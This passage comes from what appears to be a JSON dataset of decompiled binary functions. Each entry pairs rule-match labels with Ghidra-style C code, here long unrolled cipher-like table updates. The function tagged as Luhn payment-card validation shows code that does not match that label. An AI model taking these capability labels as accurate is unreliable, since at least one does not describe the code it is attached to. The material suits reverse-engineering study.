iVar2 ^ *(arg_8h + 0x814 + uVar3 * 4);\n        iVar1 = *(arg_8h + *(arg_8h + 0x1068) * 4);\n        iVar2 = *(arg_8h + 0x400 + (*(arg_8h + 0x1068) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x818 + uVar3 * 4) =\n             ((*(arg_8h + 0x81c + uVar3 * 4) >> 9 | *(arg_8h + 0x81c + uVar3 * 4) << 0x17) ^\n             (*(arg_8h + 0x104c) >> 0x16 | *(arg_8h + 0x104c) << 10)) +\n             (*(arg_8h + 0x1070) >> 0x18 | *(arg_8h + 0x1070) << 8) + *(arg_8h + 0x818 + uVar3 * 4);\n        *(arg_8h + 0x1058) = *(arg_8h + 0x818 + uVar3 * 4);\n        arg_ch[6] = iVar1 + iVar2 ^ *(arg_8h + 0x818 + uVar3 * 4);\n        iVar1 = *(arg_8h + *(arg_8h + 0x106c) * 4);\n        iVar2 = *(arg_8h + 0x400 + (*(arg_8h + 0x106c) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x81c + uVar3 * 4) =\n             ((*(arg_8h + 0x820 + uVar3 * 4) >> 9 | *(arg_8h + 0x820 + uVar3 * 4) << 0x17) ^\n             (*(arg_8h + 0x1050) >> 0x16 | *(arg_8h + 0x1050) << 10)) +\n             (*(arg_8h + 0x1074) >> 0x18 | *(arg_8h + 0x1074) << 8) + *(arg_8h + 0x81c + uVar3 * 4);\n        *(arg_8h + 0x105c) = *(arg_8h + 0x81c + uVar3 * 4);\n        arg_ch[7] = iVar1 + iVar2 ^ *(arg_8h + 0x81c + uVar3 * 4);\n        iVar1 = *(arg_8h + *(arg_8h + 0x1070) * 4);\n        iVar2 = *(arg_8h + 0x400 + (*(arg_8h + 0x1070) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x820 + uVar3 * 4) =\n             ((*(arg_8h + 0x824 + uVar3 * 4) >> 9 | *(arg_8h + 0x824 + uVar3 * 4) << 0x17) ^\n             (*(arg_8h + 0x1054) >> 0x16 | *(arg_8h + 0x1054) << 10)) +\n             (*(arg_8h + 0x1078) >> 0x18 | *(arg_8h + 0x1078) << 8) + *(arg_8h + 0x820 + uVar3 * 4);\n        *(arg_8h + 0x1060) = *(arg_8h + 0x820 + uVar3 * 4);\n        arg_ch[8] = iVar1 + iVar2 ^ *(arg_8h + 0x820 + uVar3 * 4);\n        iVar1 = *(arg_8h + *(arg_8h + 0x1074) * 4);\n        iVar2 = *(arg_8h + 0x400 + (*(arg_8h + 0x1074) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x824 + uVar3 * 4) =\n             ((*(arg_8h + 0x828 + uVar3 * 4) >> 9 | *(arg_8h + 0x828 + uVar3 * 4) << 0x17) ^\n             (*(arg_8h + 0x1058) >> 0x16 | *(arg_8h + 0x1058) << 10)) +\n             (*(arg_8h + 0x107c) >> 0x18 | *(arg_8h + 0x107c) << 8) + *(arg_8h + 0x824 + uVar3 * 4);\n        *(arg_8h + 0x1064) = *(arg_8h + 0x824 + uVar3 * 4);\n        arg_ch[9] = iVar1 + iVar2 ^ *(arg_8h + 0x824 + uVar3 * 4);\n        iVar1 = *(arg_8h + *(arg_8h + 0x1078) * 4);\n        iVar2 = *(arg_8h + 0x400 + (*(arg_8h + 0x1078) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x828 + uVar3 * 4) =\n             ((*(arg_8h + 0x82c + uVar3 * 4) >> 9 | *(arg_8h + 0x82c + uVar3 * 4) << 0x17) ^\n             (*(arg_8h + 0x105c) >> 0x16 | *(arg_8h + 0x105c) << 10)) +\n             (*(arg_8h + 0x1040) >> 0x18 | *(arg_8h + 0x1040) << 8) + *(arg_8h + 0x828 + uVar3 * 4);\n        *(arg_8h + 0x1068) = *(arg_8h + 0x828 + uVar3 * 4);\n        arg_ch[10] = iVar1 + iVar2 ^ *(arg_8h + 0x828 + uVar3 * 4);\n        iVar1 = *(arg_8h + *(arg_8h + 0x107c) * 4);\n        iVar2 = *(arg_8h + 0x400 + (*(arg_8h + 0x107c) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x82c + uVar3 * 4) =\n             ((*(arg_8h + 0x830 + uVar3 * 4) >> 9 | *(arg_8h + 0x830 + uVar3 * 4) << 0x17) ^\n             (*(arg_8h + 0x1060) >> 0x16 | *(arg_8h + 0x1060) << 10)) +\n             (*(arg_8h + 0x1044) >> 0x18 | *(arg_8h + 0x1044) << 8) + *(arg_8h + 0x82c + uVar3 * 4);\n        *(arg_8h + 0x106c) = *(arg_8h + 0x82c + uVar3 * 4);\n        arg_ch[0xb] = iVar1 + iVar2 ^ *(arg_8h + 0x82c + uVar3 * 4);\n        iVar1 = *(arg_8h + *(arg_8h + 0x1040) * 4);\n        iVar2 = *(arg_8h + 0x400 + (*(arg_8h + 0x1040) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x830 + uVar3 * 4) =\n             ((*(arg_8h + 0x834 + uVar3 * 4) >> 9 | *(arg_8h + 0x834 + uVar3 * 4) << 0x17) ^\n             (*(arg_8h + 0x1064) >> 0x16 | *(arg_8h + 0x1064) << 10)) +\n             (*(arg_8h + 0x1048) >> 0x18 | *(arg_8h + 0x1048) << 8) + *(arg_8h + 0x830 + uVar3 * 4);\n        *(arg_8h + 0x1070) = *(arg_8h + 0x830 + uVar3 * 4);\n        arg_ch[0xc] = iVar1 + iVar2 ^ *(arg_8h + 0x830 + uVar3 * 4);\n        iVar1 = *(arg_8h + *(arg_8h + 0x1044) * 4);\n        iVar2 = *(arg_8h + 0x400 + (*(arg_8h + 0x1044) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x834 + uVar3 * 4) =\n             ((*(arg_8h + 0x838 + uVar3 * 4) >> 9 | *(arg_8h + 0x838 + uVar3 * 4) << 0x17) ^\n             (*(arg_8h + 0x1068) >> 0x16 | *(arg_8h + 0x1068) << 10)) +\n             (*(arg_8h + 0x104c) >> 0x18 | *(arg_8h + 0x104c) << 8) + *(arg_8h + 0x834 + uVar3 * 4);\n        *(arg_8h + 0x1074) = *(arg_8h + 0x834 + uVar3 * 4);\n        arg_ch[0xd] = iVar1 + iVar2 ^ *(arg_8h + 0x834 + uVar3 * 4);\n        iVar1 = *(arg_8h + *(arg_8h + 0x1048) * 4);\n        iVar2 = *(arg_8h + 0x400 + (*(arg_8h + 0x1048) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x838 + uVar3 * 4) =\n             ((*(arg_8h + 0x83c + uVar3 * 4) >> 9 | *(arg_8h + 0x83c + uVar3 * 4) << 0x17) ^\n             (*(arg_8h + 0x106c) >> 0x16 | *(arg_8h + 0x106c) << 10)) +\n             (*(arg_8h + 0x1050) >> 0x18 | *(arg_8h + 0x1050) << 8) + *(arg_8h + 0x838 + uVar3 * 4);\n        *(arg_8h + 0x1078) = *(arg_8h + 0x838 + uVar3 * 4);\n        arg_ch[0xe] = iVar1 + iVar2 ^ *(arg_8h + 0x838 + uVar3 * 4);\n        iVar1 = *(arg_8h + *(arg_8h + 0x104c) * 4);\n        iVar2 = *(arg_8h + 0x400 + (*(arg_8h + 0x104c) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x83c + uVar3 * 4) =\n             ((*(arg_8h + 0x800 + uVar4 * 4) >> 9 | *(arg_8h + 0x800 + uVar4 * 4) << 0x17) ^\n             (*(arg_8h + 0x1070) >> 0x16 | *(arg_8h + 0x1070) << 10)) +\n             (*(arg_8h + 0x1054) >> 0x18 | *(arg_8h + 0x1054) << 8) + *(arg_8h + 0x83c + uVar3 * 4);\n        *(arg_8h + 0x107c) = *(arg_8h + 0x83c + uVar3 * 4);\n        arg_ch[0xf] = iVar1 + iVar2 ^ *(arg_8h + 0x83c + uVar3 * 4);\n    }\n    return;\n}\n",
        "token_count": 10479
    },
    "0040a2c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a2c0(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint var_248h;\n    uint var_244h;\n    uint var_240h;\n    uint var_23ch;\n    uint var_238h;\n    uint var_234h;\n    uint var_230h;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_214h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uint var_200h;\n    uint var_1fch;\n    uint var_1f8h;\n    uint var_1f4h;\n    uint var_1f0h;\n    uint var_1ech;\n    uint var_1e8h;\n    uint var_1e4h;\n    uint var_1e0h;\n    uint var_1dch;\n    uint var_1d8h;\n    uint var_1d4h;\n    uint var_1d0h;\n    uint var_1cch;\n    uint var_1c8h;\n    uint var_1c4h;\n    uint var_1c0h;\n    uint var_1bch;\n    uint var_1b8h;\n    uint var_1b4h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_1a4h;\n    uint var_1a0h;\n    uint var_19ch;\n    uint var_198h;\n    uint var_194h;\n    uint var_190h;\n    uint var_18ch;\n    uint var_188h;\n    uint var_184h;\n    uint var_180h;\n    uint var_17ch;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_24h;\n    uint var_4h;\n    \n    uVar1 = *(arg_8h + 0x1080) & 0x1ff;\n    uVar2 = uVar1 + 0x10 & 0x1ff;\n    if (*(arg_8h + 0x1080) < 0x200) {\n        *(arg_8h + 0x1080) = *(arg_8h + 0x1080) + 0x10U & 0x3ff;\n        *(arg_8h + uVar1 * 4) =\n             *(arg_8h + uVar1 * 4) + (*(arg_8h + 0x1018) >> 8 | *(arg_8h + 0x1018) << 0x18) +\n             ((*(arg_8h + 4 + uVar1 * 4) >> 0x17 | *(arg_8h + 4 + uVar1 * 4) << 9) ^\n             (*(arg_8h + 0x1034) >> 10 | *(arg_8h + 0x1034) << 0x16)) ^\n             *(arg_8h + 0x800 + *(arg_8h + 0x1010) * 4) + *(arg_8h + 0xc00 + (*(arg_8h + 0x1010) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1000) = *(arg_8h + uVar1 * 4);\n        *(arg_8h + 4 + uVar1 * 4) =\n             *(arg_8h + 4 + uVar1 * 4) + (*(arg_8h + 0x101c) >> 8 | *(arg_8h + 0x101c) << 0x18) +\n             ((*(arg_8h + 8 + uVar1 * 4) >> 0x17 | *(arg_8h + 8 + uVar1 * 4) << 9) ^\n             (*(arg_8h + 0x1038) >> 10 | *(arg_8h + 0x1038) << 0x16)) ^\n             *(arg_8h + 0x800 + *(arg_8h + 0x1014) * 4) + *(arg_8h + 0xc00 + (*(arg_8h + 0x1014) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1004) = *(arg_8h + 4 + uVar1 * 4);\n        *(arg_8h + 8 + uVar1 * 4) =\n             *(arg_8h + 8 + uVar1 * 4) + (*(arg_8h + 0x1020) >> 8 | *(arg_8h + 0x1020) << 0x18) +\n             ((*(arg_8h + 0xc + uVar1 * 4) >> 0x17 | *(arg_8h + 0xc + uVar1 * 4) << 9) ^\n             (*(arg_8h + 0x103c) >> 10 | *(arg_8h + 0x103c) << 0x16)) ^\n             *(arg_8h + 0x800 + *(arg_8h + 0x1018) * 4) + *(arg_8h + 0xc00 + (*(arg_8h + 0x1018) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1008) = *(arg_8h + 8 + uVar1 * 4);\n        *(arg_8h + 0xc + uVar1 * 4) =\n             *(arg_8h + 0xc + uVar1 * 4) + (*(arg_8h + 0x1024) >> 8 | *(arg_8h + 0x1024) << 0x18) +\n             ((*(arg_8h + 0x10 + uVar1 * 4) >> 0x17 | *(arg_8h + 0x10 + uVar1 * 4) << 9) ^\n             (*(arg_8h + 0x1000) >> 10 | *(arg_8h + 0x1000) << 0x16)) ^\n             *(arg_8h + 0x800 + *(arg_8h + 0x101c) * 4) + *(arg_8h + 0xc00 + (*(arg_8h + 0x101c) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x100c) = *(arg_8h + 0xc + uVar1 * 4);\n        *(arg_8h + 0x10 + uVar1 * 4) =\n             *(arg_8h + 0x10 + uVar1 * 4) + (*(arg_8h + 0x1028) >> 8 | *(arg_8h + 0x1028) << 0x18) +\n             ((*(arg_8h + 0x14 + uVar1 * 4) >> 0x17 | *(arg_8h + 0x14 + uVar1 * 4) << 9) ^\n             (*(arg_8h + 0x1004) >> 10 | *(arg_8h + 0x1004) << 0x16)) ^\n             *(arg_8h + 0x800 + *(arg_8h + 0x1020) * 4) + *(arg_8h + 0xc00 + (*(arg_8h + 0x1020) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1010) = *(arg_8h + 0x10 + uVar1 * 4);\n        *(arg_8h + 0x14 + uVar1 * 4) =\n             *(arg_8h + 0x14 + uVar1 * 4) + (*(arg_8h + 0x102c) >> 8 | *(arg_8h + 0x102c) << 0x18) +\n             ((*(arg_8h + 0x18 + uVar1 * 4) >> 0x17 | *(arg_8h + 0x18 + uVar1 * 4) << 9) ^\n             (*(arg_8h + 0x1008) >> 10 | *(arg_8h + 0x1008) << 0x16)) ^\n             *(arg_8h + 0x800 + *(arg_8h + 0x1024) * 4) + *(arg_8h + 0xc00 + (*(arg_8h + 0x1024) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1014) = *(arg_8h + 0x14 + uVar1 * 4);\n        *(arg_8h + 0x18 + uVar1 * 4) =\n             *(arg_8h + 0x18 + uVar1 * 4) + (*(arg_8h + 0x1030) >> 8 | *(arg_8h + 0x1030) << 0x18) +\n             ((*(arg_8h + 0x1c + uVar1 * 4) >> 0x17 | *(arg_8h + 0x1c + uVar1 * 4) << 9) ^\n             (*(arg_8h + 0x100c) >> 10 | *(arg_8h + 0x100c) << 0x16)) ^\n             *(arg_8h + 0x800 + *(arg_8h + 0x1028) * 4) + *(arg_8h + 0xc00 + (*(arg_8h + 0x1028) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1018) = *(arg_8h + 0x18 + uVar1 * 4);\n        *(arg_8h + 0x1c + uVar1 * 4) =\n             *(arg_8h + 0x1c + uVar1 * 4) + (*(arg_8h + 0x1034) >> 8 | *(arg_8h + 0x1034) << 0x18) +\n             ((*(arg_8h + 0x20 + uVar1 * 4) >> 0x17 | *(arg_8h + 0x20 + uVar1 * 4) << 9) ^\n             (*(arg_8h + 0x1010) >> 10 | *(arg_8h + 0x1010) << 0x16)) ^\n             *(arg_8h + 0x800 + *(arg_8h + 0x102c) * 4) + *(arg_8h + 0xc00 + (*(arg_8h + 0x102c) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x101c) = *(arg_8h + 0x1c + uVar1 * 4);\n        *(arg_8h + 0x20 + uVar1 * 4) =\n             *(arg_8h + 0x20 + uVar1 * 4) + (*(arg_8h + 0x1038) >> 8 | *(arg_8h + 0x1038) << 0x18) +\n             ((*(arg_8h + 0x24 + uVar1 * 4) >> 0x17 | *(arg_8h + 0x24 + uVar1 * 4) << 9) ^\n             (*(arg_8h + 0x1014) >> 10 | *(arg_8h + 0x1014) << 0x16)) ^\n             *(arg_8h + 0x800 + *(arg_8h + 0x1030) * 4) + *(arg_8h + 0xc00 + (*(arg_8h + 0x1030) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1020) = *(arg_8h + 0x20 + uVar1 * 4);\n        *(arg_8h + 0x24 + uVar1 * 4) =\n             *(arg_8h + 0x24 + uVar1 * 4) + (*(arg_8h + 0x103c) >> 8 | *(arg_8h + 0x103c) << 0x18) +\n             ((*(arg_8h + 0x28 + uVar1 * 4) >> 0x17 | *(arg_8h + 0x28 + uVar1 * 4) << 9) ^\n             (*(arg_8h + 0x1018) >> 10 | *(arg_8h + 0x1018) << 0x16)) ^\n             *(arg_8h + 0x800 + *(arg_8h + 0x1034) * 4) + *(arg_8h + 0xc00 + (*(arg_8h + 0x1034) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1024) = *(arg_8h + 0x24 + uVar1 * 4);\n        *(arg_8h + 0x28 + uVar1 * 4) =\n             *(arg_8h + 0x28 + uVar1 * 4) + (*(arg_8h + 0x1000) >> 8 | *(arg_8h + 0x1000) << 0x18) +\n             ((*(arg_8h + 0x2c + uVar1 * 4) >> 0x17 | *(arg_8h + 0x2c + uVar1 * 4) << 9) ^\n             (*(arg_8h + 0x101c) >> 10 | *(arg_8h + 0x101c) << 0x16)) ^\n             *(arg_8h + 0x800 + *(arg_8h + 0x1038) * 4) + *(arg_8h + 0xc00 + (*(arg_8h + 0x1038) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1028) = *(arg_8h + 0x28 + uVar1 * 4);\n        *(arg_8h + 0x2c + uVar1 * 4) =\n             *(arg_8h + 0x2c + uVar1 * 4) + (*(arg_8h + 0x1004) >> 8 | *(arg_8h + 0x1004) << 0x18) +\n             ((*(arg_8h + 0x30 + uVar1 * 4) >> 0x17 | *(arg_8h + 0x30 + uVar1 * 4) << 9) ^\n             (*(arg_8h + 0x1020) >> 10 | *(arg_8h + 0x1020) << 0x16)) ^\n             *(arg_8h + 0x800 + *(arg_8h + 0x103c) * 4) + *(arg_8h + 0xc00 + (*(arg_8h + 0x103c) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x102c) = *(arg_8h + 0x2c + uVar1 * 4);\n        *(arg_8h + 0x30 + uVar1 * 4) =\n             *(arg_8h + 0x30 + uVar1 * 4) + (*(arg_8h + 0x1008) >> 8 | *(arg_8h + 0x1008) << 0x18) +\n             ((*(arg_8h + 0x34 + uVar1 * 4) >> 0x17 | *(arg_8h + 0x34 + uVar1 * 4) << 9) ^\n             (*(arg_8h + 0x1024) >> 10 | *(arg_8h + 0x1024) << 0x16)) ^\n             *(arg_8h + 0x800 + *(arg_8h + 0x1000) * 4) + *(arg_8h + 0xc00 + (*(arg_8h + 0x1000) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1030) = *(arg_8h + 0x30 + uVar1 * 4);\n        *(arg_8h + 0x34 + uVar1 * 4) =\n             *(arg_8h + 0x34 + uVar1 * 4) + (*(arg_8h + 0x100c) >> 8 | *(arg_8h + 0x100c) << 0x18) +\n             ((*(arg_8h + 0x38 + uVar1 * 4) >> 0x17 | *(arg_8h + 0x38 + uVar1 * 4) << 9) ^\n             (*(arg_8h + 0x1028) >> 10 | *(arg_8h + 0x1028) << 0x16)) ^\n             *(arg_8h + 0x800 + *(arg_8h + 0x1004) * 4) + *(arg_8h + 0xc00 + (*(arg_8h + 0x1004) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1034) = *(arg_8h + 0x34 + uVar1 * 4);\n        *(arg_8h + 0x38 + uVar1 * 4) =\n             *(arg_8h + 0x38 + uVar1 * 4) + (*(arg_8h + 0x1010) >> 8 | *(arg_8h + 0x1010) << 0x18) +\n             ((*(arg_8h + 0x3c + uVar1 * 4) >> 0x17 | *(arg_8h + 0x3c + uVar1 * 4) << 9) ^\n             (*(arg_8h + 0x102c) >> 10 | *(arg_8h + 0x102c) << 0x16)) ^\n             *(arg_8h + 0x800 + *(arg_8h + 0x1008) * 4) + *(arg_8h + 0xc00 + (*(arg_8h + 0x1008) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1038) = *(arg_8h + 0x38 + uVar1 * 4);\n        *(arg_8h + 0x3c + uVar1 * 4) =\n             *(arg_8h + 0x3c + uVar1 * 4) + (*(arg_8h + 0x1014) >> 8 | *(arg_8h + 0x1014) << 0x18) +\n             ((*(arg_8h + uVar2 * 4) >> 0x17 | *(arg_8h + uVar2 * 4) << 9) ^\n             (*(arg_8h + 0x1030) >> 10 | *(arg_8h + 0x1030) << 0x16)) ^\n             *(arg_8h + 0x800 + *(arg_8h + 0x100c) * 4) + *(arg_8h + 0xc00 + (*(arg_8h + 0x100c) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x103c) = *(arg_8h + 0x3c + uVar1 * 4);\n    }\n    else {\n        *(arg_8h + 0x1080) = *(arg_8h + 0x1080) + 0x10U & 0x3ff;\n        *(arg_8h + 0x800 + uVar1 * 4) =\n             *(arg_8h + 0x800 + uVar1 * 4) + (*(arg_8h + 0x1058) >> 0x18 | *(arg_8h + 0x1058) << 8) +\n             ((*(arg_8h + 0x804 + uVar1 * 4) >> 9 | *(arg_8h + 0x804 + uVar1 * 4) << 0x17) ^\n             (*(arg_8h + 0x1074) >> 0x16 | *(arg_8h + 0x1074) << 10)) ^\n             *(arg_8h + *(arg_8h + 0x1050) * 4) + *(arg_8h + 0x400 + (*(arg_8h + 0x1050) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1040) = *(arg_8h + 0x800 + uVar1 * 4);\n        *(arg_8h + 0x804 + uVar1 * 4) =\n             *(arg_8h + 0x804 + uVar1 * 4) + (*(arg_8h + 0x105c) >> 0x18 | *(arg_8h + 0x105c) << 8) +\n             ((*(arg_8h + 0x808 + uVar1 * 4) >> 9 | *(arg_8h + 0x808 + uVar1 * 4) << 0x17) ^\n             (*(arg_8h + 0x1078) >> 0x16 | *(arg_8h + 0x1078) << 10)) ^\n             *(arg_8h + *(arg_8h + 0x1054) * 4) + *(arg_8h + 0x400 + (*(arg_8h + 0x1054) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1044) = *(arg_8h + 0x804 + uVar1 * 4);\n        *(arg_8h + 0x808 + uVar1 * 4) =\n             *(arg_8h + 0x808 + uVar1 * 4) + (*(arg_8h + 0x1060) >> 0x18 | *(arg_8h + 0x1060) << 8) +\n             ((*(arg_8h + 0x80c + uVar1 * 4) >> 9 | *(arg_8h + 0x80c + uVar1 * 4) << 0x17) ^\n             (*(arg_8h + 0x107c) >> 0x16 | *(arg_8h + 0x107c) << 10)) ^\n             *(arg_8h + *(arg_8h + 0x1058) * 4) + *(arg_8h + 0x400 + (*(arg_8h + 0x1058) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1048) = *(arg_8h + 0x808 + uVar1 * 4);\n        *(arg_8h + 0x80c + uVar1 * 4) =\n             *(arg_8h + 0x80c + uVar1 * 4) + (*(arg_8h + 0x1064) >> 0x18 | *(arg_8h + 0x1064) << 8) +\n             ((*(arg_8h + 0x810 + uVar1 * 4) >> 9 | *(arg_8h + 0x810 + uVar1 * 4) << 0x17) ^\n             (*(arg_8h + 0x1040) >> 0x16 | *(arg_8h + 0x1040) << 10)) ^\n             *(arg_8h + *(arg_8h + 0x105c) * 4) + *(arg_8h + 0x400 + (*(arg_8h + 0x105c) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x104c) = *(arg_8h + 0x80c + uVar1 * 4);\n        *(arg_8h + 0x810 + uVar1 * 4) =\n             *(arg_8h + 0x810 + uVar1 * 4) + (*(arg_8h + 0x1068) >> 0x18 | *(arg_8h + 0x1068) << 8) +\n             ((*(arg_8h + 0x814 + uVar1 * 4) >> 9 | *(arg_8h + 0x814 + uVar1 * 4) << 0x17) ^\n             (*(arg_8h + 0x1044) >> 0x16 | *(arg_8h + 0x1044) << 10)) ^\n             *(arg_8h + *(arg_8h + 0x1060) * 4) + *(arg_8h + 0x400 + (*(arg_8h + 0x1060) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1050) = *(arg_8h + 0x810 + uVar1 * 4);\n        *(arg_8h + 0x814 + uVar1 * 4) =\n             *(arg_8h + 0x814 + uVar1 * 4) + (*(arg_8h + 0x106c) >> 0x18 | *(arg_8h + 0x106c) << 8) +\n             ((*(arg_8h + 0x818 + uVar1 * 4) >> 9 | *(arg_8h + 0x818 + uVar1 * 4) << 0x17) ^\n             (*(arg_8h + 0x1048) >> 0x16 | *(arg_8h + 0x1048) << 10)) ^\n             *(arg_8h + *(arg_8h + 0x1064) * 4) + *(arg_8h + 0x400 + (*(arg_8h + 0x1064) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1054) = *(arg_8h + 0x814 + uVar1 * 4);\n        *(arg_8h + 0x818 + uVar1 * 4) =\n             *(arg_8h + 0x818 + uVar1 * 4) + (*(arg_8h + 0x1070) >> 0x18 | *(arg_8h + 0x1070) << 8) +\n             ((*(arg_8h + 0x81c + uVar1 * 4) >> 9 | *(arg_8h + 0x81c + uVar1 * 4) << 0x17) ^\n             (*(arg_8h + 0x104c) >> 0x16 | *(arg_8h + 0x104c) << 10)) ^\n             *(arg_8h + *(arg_8h + 0x1068) * 4) + *(arg_8h + 0x400 + (*(arg_8h + 0x1068) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1058) = *(arg_8h + 0x818 + uVar1 * 4);\n        *(arg_8h + 0x81c + uVar1 * 4) =\n             *(arg_8h + 0x81c + uVar1 * 4) + (*(arg_8h + 0x1074) >> 0x18 | *(arg_8h + 0x1074) << 8) +\n             ((*(arg_8h + 0x820 + uVar1 * 4) >> 9 | *(arg_8h + 0x820 + uVar1 * 4) << 0x17) ^\n             (*(arg_8h + 0x1050) >> 0x16 | *(arg_8h + 0x1050) << 10)) ^\n             *(arg_8h + *(arg_8h + 0x106c) * 4) + *(arg_8h + 0x400 + (*(arg_8h + 0x106c) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x105c) = *(arg_8h + 0x81c + uVar1 * 4);\n        *(arg_8h + 0x820 + uVar1 * 4) =\n             *(arg_8h + 0x820 + uVar1 * 4) + (*(arg_8h + 0x1078) >> 0x18 | *(arg_8h + 0x1078) << 8) +\n             ((*(arg_8h + 0x824 + uVar1 * 4) >> 9 | *(arg_8h + 0x824 + uVar1 * 4) << 0x17) ^\n             (*(arg_8h + 0x1054) >> 0x16 | *(arg_8h + 0x1054) << 10)) ^\n             *(arg_8h + *(arg_8h + 0x1070) * 4) + *(arg_8h + 0x400 + (*(arg_8h + 0x1070) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1060) = *(arg_8h + 0x820 + uVar1 * 4);\n        *(arg_8h + 0x824 + uVar1 * 4) =\n             *(arg_8h + 0x824 + uVar1 * 4) + (*(arg_8h + 0x107c) >> 0x18 | *(arg_8h + 0x107c) << 8) +\n             ((*(arg_8h + 0x828 + uVar1 * 4) >> 9 | *(arg_8h + 0x828 + uVar1 * 4) << 0x17) ^\n             (*(arg_8h + 0x1058) >> 0x16 | *(arg_8h + 0x1058) << 10)) ^\n             *(arg_8h + *(arg_8h + 0x1074) * 4) + *(arg_8h + 0x400 + (*(arg_8h + 0x1074) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1064) = *(arg_8h + 0x824 + uVar1 * 4);\n        *(arg_8h + 0x828 + uVar1 * 4) =\n             *(arg_8h + 0x828 + uVar1 * 4) + (*(arg_8h + 0x1040) >> 0x18 | *(arg_8h + 0x1040) << 8) +\n             ((*(arg_8h + 0x82c + uVar1 * 4) >> 9 | *(arg_8h + 0x82c + uVar1 * 4) << 0x17) ^\n             (*(arg_8h + 0x105c) >> 0x16 | *(arg_8h + 0x105c) << 10)) ^\n             *(arg_8h + *(arg_8h + 0x1078) * 4) + *(arg_8h + 0x400 + (*(arg_8h + 0x1078) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1068) = *(arg_8h + 0x828 + uVar1 * 4);\n        *(arg_8h + 0x82c + uVar1 * 4) =\n             *(arg_8h + 0x82c + uVar1 * 4) + (*(arg_8h + 0x1044) >> 0x18 | *(arg_8h + 0x1044) << 8) +\n             ((*(arg_8h + 0x830 + uVar1 * 4) >> 9 | *(arg_8h + 0x830 + uVar1 * 4) << 0x17) ^\n             (*(arg_8h + 0x1060) >> 0x16 | *(arg_8h + 0x1060) << 10)) ^\n             *(arg_8h + *(arg_8h + 0x107c) * 4) + *(arg_8h + 0x400 + (*(arg_8h + 0x107c) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x106c) = *(arg_8h + 0x82c + uVar1 * 4);\n        *(arg_8h + 0x830 + uVar1 * 4) =\n             *(arg_8h + 0x830 + uVar1 * 4) + (*(arg_8h + 0x1048) >> 0x18 | *(arg_8h + 0x1048) << 8) +\n             